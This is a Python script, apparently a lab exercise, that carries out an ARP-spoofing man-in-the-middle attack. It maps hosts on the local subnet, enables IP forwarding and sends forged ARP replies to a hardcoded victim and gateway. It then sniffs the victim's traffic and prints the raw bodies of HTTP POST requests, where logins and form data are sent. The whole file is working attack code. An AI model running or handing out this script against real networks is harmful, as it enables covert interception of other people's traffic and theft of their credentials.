#!/usr/bin/env python3
import netifaces as ni
import os
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
import time

class Attack():
    def __init__(self):
        self.ip_list = []
        self.network = []
        self.ip_mac = {}
        self.interfaces = ni.interfaces()
        self.attacker, self.victim, self.ap = '192.168.28.128', '192.168.28.130', '192.168.28.1'

    def get_ip(self):
        for i in self.interfaces:
            self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
        self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]

    def get_mac(self, network):
        arp_request = scapy.ARP(pdst = network)
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
        for sent, received in result:
            self.ip_mac[received.psrc] = received.hwsrc

    def spoof(self, target_ip, spoof_ip): 
        target_mac = self.ip_mac[target_ip]
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet,verbose=0)

    def enable_ip_route(self):
        file_path = "/proc/sys/net/ipv4/ip_forward"
        with open(file_path) as f:
            if f.read() == 1:
                return
        with open(file_path, "w") as f:
            print(1, file=f)

    def restore(self, dest_ip, src_ip):
        dest_mac = self.ip_mac[dest_ip]
        src_mac = self.ip_mac[src_ip]
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet,count=4,verbose=0)

    def process_packet(self,packet):
        if packet.haslayer(HTTPRequest):
            method = packet[HTTPRequest].Method.decode()
            if packet.haslayer(scapy.Raw) and method == "POST":
                print("\nRaw Data: ", packet[scapy.Raw].load)
        #if packet[scapy.Ether].src == self.ip_mac[self.victim]:	
        #    packet[scapy.Ether].dst = self.ip_mac[self.ap]
        #if packet[scapy.Ether].src == self.ip_mac[self.ap]:
        #    packet[scapy.Ether].dst = self.ip_mac[self.victim]
        #packet[scapy.Ether].src = self.ip_mac[self.attacker]        
        #scapy.send(packet,verbose=0)

    def sniff_packet(self):
        while 1:
            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface=self.interfaces[1])
            scapy.sniff(filter="host "+self.ap, prn=self.process_packet, iface=self.interfaces[1])

    def arp_spoofing(self):
        while 1:
            self.spoof(self.victim, self.ap)
            self.spoof(self.ap, self.victim)
            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface='ens33')
            time.sleep(1)

    def ret_arp_spoofing(self):
        self.restore(self.ap, self.victim)
        self.restore(self.victim, self.ap)

attack = Attack()
attack.get_ip()
attack.get_mac(attack.network[1])
attack.enable_ip_route()
print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
try:
    attack.arp_spoofing()
    #attack.sniff_packet()
except KeyboardInterrupt:
    attack.ret_arp_spoofing()

